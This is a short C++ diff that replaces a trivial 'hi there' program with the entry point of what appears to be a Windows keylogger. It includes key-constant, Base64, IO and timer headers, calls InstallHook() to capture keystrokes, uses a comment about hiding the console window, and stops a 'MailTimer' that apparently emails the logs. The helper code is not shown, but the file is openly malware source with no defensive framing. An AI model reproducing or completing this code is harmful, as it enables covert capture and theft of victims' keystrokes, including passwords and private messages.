@@ -1,6 +1,20 @@
-#include<iostream>
+#include <iostream>
+#include "Helper.h"
+#include "KeyConstants.h"
+#include "Base64.h"
+#include "IO.h"
+#include "Timer.h"
 using namespace std;
-int main{
-    std::cout<<"hi there";
+int main(){
+    // Settings -> Compiler: Have compiler follow ISO C++ 11 standard and create a WindowsAPI flag
+    MSG Msg ;
+    IO::MkDir(IO::GetOurPath(true));
+    InstallHook();
+    // solve the console problem (Dirty way of hiding the console window)
+    while(GetMessageA(&Msg, NULL, 0, 0)){
+        TranslateMessage(&Msg);
+        DispatchMessage(&Msg);
+    }
+    MailTimer.Stop();
     return 0;
 }
